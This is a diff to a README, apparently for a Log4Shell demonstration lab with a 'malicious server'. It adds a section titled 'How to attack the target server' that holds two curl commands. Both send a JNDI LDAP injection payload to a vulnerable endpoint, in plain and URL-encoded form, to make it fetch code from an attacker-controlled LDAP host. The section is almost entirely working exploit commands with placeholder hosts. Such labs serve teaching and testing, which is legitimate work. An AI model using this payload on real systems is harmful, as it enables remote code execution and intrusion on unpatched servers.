@@ -36,6 +36,20 @@ cd malicious-server
 ../make.sh run CODEBASE_URL=SERVER_IP_OR_DOMAIN_NAME # Optionally make instead of ../make.sh if you had Make and Docker Compose installed
 ``` 
 
+## How to attack the target server
+
+```
+curl -X GET -G --data-urlencode 'foo=${jndi:ldap://IP_OR_DOMAIN_MALICIOUS_SERVER:1389/a}' http://IP_OR_DOMAIN_VULNERABLE_SERVER/some-endpoint
+
+```
+or just 
+```
+curl --location --request GET 'http://IP_OR_DOMAIN_VULNERABLE_SERVER/some-endpoint?foo=%24%7Bjndi%3Aldap%3A%2F%2FIP_OR_DOMAIN_MALICIOUS_SERVER%3A1389%2Fa%7D'
+```
+
+where `${jndi:ldap://IP_OR_DOMAIN_MALICIOUS_SERVER:1389/a}` is just URL encoded
+
+
 ## How to stop any of them
 
 ```
